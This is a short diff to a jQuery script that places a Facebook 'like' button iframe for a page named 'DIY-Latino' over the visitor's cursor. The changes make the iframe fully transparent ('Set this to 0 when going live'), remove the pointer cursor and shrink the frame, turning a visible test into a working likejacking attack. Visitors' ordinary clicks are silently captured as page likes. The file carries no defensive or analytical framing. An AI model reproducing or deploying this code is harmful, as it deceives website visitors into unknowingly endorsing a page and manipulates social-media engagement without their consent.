@@ -4,10 +4,10 @@
 var page_ = encodeURIComponent("https://www.facebook.com/DIY-Latino-1772965009583630/");
 
 //Set the opacity of the like button. Set this to 0 when going live
-var Opacity = 100;
+var Opacity = 0;
 
 //Whether to use a pointer cursor or the default cursor
-var use_pointer = "pointer";
+var use_pointer = false;
 
 
 
@@ -26,11 +26,11 @@ var newOP = (parseInt(Opacity) / parseInt(100));
 
 $(document).ready(function() {
     var $div = $(
-	' <div id="vvrapper"><iframe id="lmao" src="https://www.facebook.com/plugins/like.php?href='+page_+'&width=50&layout=button&action=like&size=large&show_faces=false&share=false&height=65&appId" width="30" height="30" style="border:none;pointer-events:none;overflow:hidden;position:absolute;top:0; left:0;filter:alpha(opacity='+Opacity+');opacity:'+newOP+';z-index:99" scrolling="no" frameborder="0" allowTransparency="true"></iframe><div id="anti-cursor"></div> </div>'
+	' <div id="vvrapper"><iframe id="lmao" src="https://www.facebook.com/plugins/like.php?href='+page_+'&width=50&layout=button&action=like&size=large&show_faces=false&share=false&height=65&appId" width="30" height="20" style="border:none;pointer-events:none;overflow:hidden;position:absolute;top:0; left:0;filter:alpha(opacity='+Opacity+');opacity:'+newOP+';z-index:99" scrolling="no" frameborder="0" allowTransparency="true"></iframe><div id="anti-cursor"></div> </div>'
 	).appendTo("body");
 
 
-window.setInterval(ganttEach, 5000);
+window.setInterval(ganttEach, 7000);
 
 
 $('#anti-cursorr').css({
@@ -39,7 +39,7 @@ $('#anti-cursorr').css({
 	left: 0,
 	cursor: cursor,
 	width: 30,
-	height: 30,
+	height: 20,
 	'pointer-events':'none',
 	'z-index': 100
 		});
